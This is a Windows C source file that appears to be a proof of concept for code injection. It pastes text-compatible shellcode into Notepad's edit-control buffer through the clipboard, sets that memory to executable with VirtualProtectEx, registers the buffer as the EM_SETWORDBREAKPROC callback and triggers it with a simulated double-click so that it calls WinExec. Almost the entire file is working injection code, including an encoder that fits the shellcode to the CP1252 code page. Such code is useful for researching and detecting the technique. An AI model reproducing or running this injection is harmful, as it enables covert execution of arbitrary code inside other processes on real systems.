

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

// default is 1 second
#define WAIT_TIME 1000

// obtain process name from process id
PCHAR pid2name(DWORD pid) {
    HANDLE         ss;
    BOOL           r;
    PROCESSENTRY32 pe;
    PCHAR          str="N/A";
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (ss != INVALID_HANDLE_VALUE) {
      pe.dwSize = sizeof(PROCESSENTRY32);
      
      if(Process32First(ss, &pe)) {
        do {
          if (pe.th32ProcessID == pid) {
            str = pe.szExeFile;
            break;
          }
        } while (Process32Next(ss, &pe));
        CloseHandle(ss);
      }
    }
    return str;
}

// obtain process id from process name
DWORD name2pid(LPSTR ImageName) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    DWORD          pid=0;
    
    // create snapshot of system
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return 0;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(ss, &pe)){
      do {
        if (lstrcmpi(ImageName, pe.szExeFile)==0) {
          pid = pe.th32ProcessID;
          break;
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
    return pid;
}

// read base address of DLL loaded in remote process
LPVOID GetProcessModuleHandle(DWORD pid, LPCSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

// the max address for virtual memory on 
// windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
#define MAX_ADDR 6

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
  
    // zero is allowed, but we can't use it for the clipboard
    if(ch == 0) return 0;
    
    // bytes converted to double byte characters
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

// Allocate 64-bit buffer on the stack.
// Then place the address in RDI for writing.
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x5d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
};

// Transfers control of execution to kernel32!WinExec
#define RET_SIZE 2

char RET[] = {
  /* 0000 */ "\xc3" /* ret  */
  /* 0002 */ "\x00"
};

#define RET_OFS2 0x18 + 2

#include "calc4.h"

#define RET_OFS 0x20 + 2

#include "calc3.h"

static
u8* cp1252_generate_winexec(int pid, int *cslen) {
    int     i, ofs, outlen;
    u8      *cs, *out;
    HMODULE m;
    w64_t   addr;
    
    // it won't exceed 512 bytes
    out = (u8*)cs = VirtualAlloc(
      NULL, 4096, 
      MEM_COMMIT | MEM_RESERVE, 
      PAGE_EXECUTE_READWRITE);
    
    // initialize parameters for WinExec()
    memcpy(out, CALC3, CALC3_SIZE);
    out += CALC3_SIZE;

    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store kernel32!WinExec on stack
    m = GetModuleHandle("kernel32");
    printf("  [+] Local Base address for kernel32 : %p\n", (PVOID)m);
    addr.q = ((PBYTE)GetProcAddress(m, "WinExec") - (PBYTE)m);
    m = GetProcessModuleHandle(pid, "kernel32.dll");
    printf("  [+] Remote Base address for kernel32 : %p\n", (PVOID)m);
    addr.q += (ULONG_PTR)m;
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // calculate length of constructed code
    ofs = (int)(out - (u8*)cs) + 2;
    
    // first offset
    cs[RET_OFS] = (uint8_t)ofs;
    
    memcpy(out, RET, RET_SIZE);
    out += RET_SIZE;
    
    memcpy(out, CALC4, CALC4_SIZE);
    
    // second offset
    ofs = CALC4_SIZE;
    ((u8*)out)[RET_OFS2] = (uint8_t)ofs;
    out += CALC4_SIZE;
    
    outlen = ((int)(out - (u8*)cs) + 1) & -2;

    FILE *fd = fopen("unicode.bin", "wb");
    fwrite(cs, 1, outlen, fd);
    fclose(fd);
    
    // convert to ascii
    for(i=0; i<=outlen; i+=2) {
      cs[i/2] = cs[i];
    }

    *cslen = outlen / 2;
    
    // save to file for inspection
    fd = fopen("ascii.bin", "wb");
    fwrite(cs, 1, *cslen, fd);
    fclose(fd);
    
    // return pointer to code
    return cs;
}

// copy data to the clipboard
BOOL CopyToClipboard(UINT format, void *data, int cch) {
    LPTSTR  str; 
    HGLOBAL gmem = NULL;
    BOOL    bResult = FALSE;
    HANDLE  hcb;
    
    if(!OpenClipboard(NULL)) {
      printf("  [-] %s : OpenClipboard() failed.\n", __FUNCTION__);
      return FALSE;
    }
    
    if(!EmptyClipboard()) {
      printf("  [-] %s : EmptyClipboard() failed.\n", __FUNCTION__);
      goto exit_copy;
    }
      
    gmem = GlobalAlloc(
      GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
      
    if(gmem == NULL) {
      printf("  [-] %s : GlobalAlloc() failed.\n", __FUNCTION__);
      goto exit_copy;
    }
    
    str = GlobalLock(gmem); 
    if(str == NULL) {
      printf("  [-] %s : GlobalLock failed.\n", __FUNCTION__);
      goto exit_copy;
    }
    
    CopyMemory(str, data, cch); 
    GlobalUnlock(gmem);
    hcb = SetClipboardData(format, gmem);
    bResult = (hcb != NULL);
exit_copy:
    if(gmem != NULL) GlobalFree(gmem);
    CloseClipboard();
    return bResult;
}

BOOL em_inject(void) {
    HWND   npw, ecw;
    w64_t  emh, lastbuf, embuf;
    SIZE_T rd;
    HANDLE hp;
    DWORD  cslen, pid, old;
    BOOL   r;
    PBYTE  cs;
    
    char   buf[1024];
    
    // get window handle for notepad class
    npw = FindWindow("Notepad", NULL);
    if(npw == NULL) {
      printf("  [-] Unable to find Notepad. Is it running?\n");
      return FALSE;
    }
    
    // get window handle for edit control
    ecw = FindWindowEx(npw, NULL, "Edit", NULL);
    if(ecw == NULL) {
      printf("  [-] Unable to find Edit Control for Notepad.\n");
      return FALSE;
    }
    
    // get the EM handle for the edit control
    emh.p = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);
    if(emh.p == NULL) {
      printf("  [-] Unable to read EM handle for %p\n", ecw);
      return FALSE;
    }
    
    // get the process id for the window and open the process
    if(GetWindowThreadProcessId(ecw, &pid) == 0) {
      printf("  [-] Unable to read process id for %p\n", ecw);
      return FALSE;
    }
    
    // copy some test data to the clipboard
    memset(buf, 0x4d, sizeof(buf));

    if(!CopyToClipboard(CF_TEXT, buf, sizeof(buf))) {
      printf("  [-] CopyToClipboard failed.\n");
      return FALSE;
    }
    
    // open the process for reading and changing memory permissions
    hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if(hp == NULL) {
      printf("  [-] Unable to open process for %p\n", ecw);
      return FALSE;
    }
    
    // loop until target buffer address is stable
    lastbuf.p = NULL;
    r = FALSE;
    
    for(;;) {
      printf("  [+] Reading address of buffer : ");       
      if(!ReadProcessMemory(hp, emh.p, 
        &embuf.p, sizeof(ULONG_PTR), &rd)) {
        printf("FAILED!\n");
        break;
      }
      
      printf("%p\n", embuf.p);
      
      // Address hasn't changed? exit loop
      if(embuf.p == lastbuf.p) {
        r = TRUE;
        printf("  [+] Buffer appears to be ready.\n");
        break;
      }
      // save this address
      lastbuf.p = embuf.p;
    
      // clear the contents of edit control
      SendMessage(ecw, EM_SETSEL, 0, -1);
      SendMessage(ecw, WM_CLEAR, 0, 0);
      
      // send the WM_PASTE message to the edit control
      // allow notepad some time to read the data from clipboard
      printf("  [+] Sending WM_PASTE to %p\n", (PVOID)ecw);
      SendMessage(ecw, WM_PASTE, 0, 0);
      Sleep(WAIT_TIME);
    }
    
    if(r) {
      printf("  [+] Setting %p to RWX...", embuf.p);
      if(VirtualProtectEx(hp, embuf.p, 
        4096, PAGE_EXECUTE_READWRITE, &old))
      {
        printf("OK.\n");
        
        printf("  [+] Generating shellcode for %p\n", embuf.p);
        cs = cp1252_generate_winexec(pid, &cslen);
        
        printf("  [+] Injecting %i bytes of shellcode with WM_PASTE.\n", cslen);
        CopyToClipboard(CF_TEXT, cs, cslen);
        
        printf("  [+] Clearing buffer.\n");
        SendMessage(ecw, EM_SETSEL, 0, -1);
        SendMessage(ecw, WM_CLEAR, 0, 0);
        
        SendMessage(ecw, WM_PASTE, 0, 0);
        Sleep(WAIT_TIME);
        
        printf("  [+] Setting EM_SETWORDBREAKPROC to shellcode at %p\n", embuf.p);
        SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
   
        printf("  [+] Executing shellcode with WM_LBUTTONDBLCLK.\n");
        SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
        
        printf("  [+] Setting EM_SETWORDBREAKPROC to %p\n", NULL);
        SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
        
        printf("  [+] Setting %p to RW...", embuf.p);
        r = VirtualProtectEx(hp, embuf.p,
          4096, PAGE_READWRITE, &old);
          
        printf("%s\n", r ? "OK" : "FAILED");
      } else {
        printf("VirtualProtectEx error %i.\n", GetLastError());
      }
    }
    CloseHandle(hp);
    return r;
}

int main(int argc, char *argv[]) {
    if(!em_inject()) {
      printf("  [+] Running notepad...\n");
      WinExec("notepad", SW_SHOW);
      em_inject();
    }
    return 0;
}
